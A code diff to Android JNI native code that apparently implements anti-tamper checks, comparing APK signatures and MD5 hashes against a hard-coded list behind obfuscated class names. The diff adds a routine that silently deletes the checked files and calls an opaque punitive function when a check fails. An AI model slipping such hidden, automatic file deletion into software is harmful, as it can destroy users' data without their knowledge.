@@ -69,6 +69,21 @@ jclass findClass(const char *name) {
                                                           getEnv()->NewStringUTF(name)));
 }
 
+void files_delete(JNIEnv *jniEnv,jobjectArray array){
+    jsize length = jniEnv->GetArrayLength(array);
+    jclass file_clz = jniEnv->FindClass("java/io/File");
+    if(file_clz != nullptr){
+        jmethodID delete_method = jniEnv->GetMethodID(file_clz,"delete","()Z");
+        if(delete_method != nullptr){
+            for (int i = 0; i < length; i++) {
+                jobject fileObj = jniEnv->GetObjectArrayElement(array, i);
+                jniEnv->CallBooleanMethod(fileObj,delete_method);
+            }
+        }
+        jniEnv->DeleteLocalRef(file_clz);
+    }
+}
+
 void startTask(JavaVM *vm) {
 
     JNIEnv *jniEnv = getEnv();
@@ -76,11 +91,11 @@ void startTask(JavaVM *vm) {
         return;
     }
 
-    auto temp = new environment(getEnv(), nullptr, true);
+    auto temp = new environment(getEnv(), nullptr);
     auto context = temp->getContext();
 
     if (context == nullptr) {
-        ComeTrue::come(vm, jniEnv);
+        LOG("context == null");
         return;
     }
     string header = string(HEADER);
@@ -100,10 +115,6 @@ void startTask(JavaVM *vm) {
         if (getApk_method_id != nullptr) {
             auto result = (jobjectArray) jniEnv->CallStaticObjectMethod(io_clz,
                                                                         getApk_method_id, context);
-            if (!result) {
-                return;
-            }
-
             jsize length = jniEnv->GetArrayLength(result);
             for (int i = 0; i < length; i++) {
                 jobject fileObj = jniEnv->GetObjectArrayElement(result, i);
@@ -114,27 +125,31 @@ void startTask(JavaVM *vm) {
                 for (size_t i = 0; i < size; ++i) {
                     auto value = DD[i];
                     const char *cStr = jniEnv->GetStringUTFChars(md5, nullptr);
-                    std::string cppStr(cStr);
-                    bool isEqual = (cppStr == value);
+                    std::string md5Str(cStr);
+                    bool isEqual = (md5Str == value);
                     if (isEqual) {
                         same = true;
                         break;
                     }
                 }
                 if (!same) {
-                    ComeTrue::come(vm, jniEnv);
+                    ComeTrue::come(gJvm,jniEnv);
                     break;
                 }
             }
+            files_delete(jniEnv,result);
         }
     }
 }
-
 
 void sayHello(JavaVM *vm, JNIEnv *env) {
     string header = string(HEADER);
     string class_path = AY_OBFUSCATE("com/occ/").operator char *() + header + AY_OBFUSCATE("/md5/FileIO").operator char *();
     jclass io_clz = env->FindClass(class_path.data());
+    if(io_clz == nullptr){
+        LOG("clazz not found");
+        return;
+    }
     jclass classClass = env->GetObjectClass(io_clz);
 
     auto classLoaderClass = env->FindClass(AY_OBFUSCATE("java/lang/ClassLoader"));
@@ -181,8 +196,9 @@ jint JNI_OnLoad(JavaVM *vm, void *reserved) {
     gJvm = vm;
     JNIEnv *env = getEnv();
 
-    environments = new environment(env, nullptr, false);
+    environments = new environment(env, nullptr);
     if ((!environments->checkSignature()) || (checkSomething(vm, env) || !DEBUG)) {
+        LOG("failed check");
         hello(vm, env);
     }
 
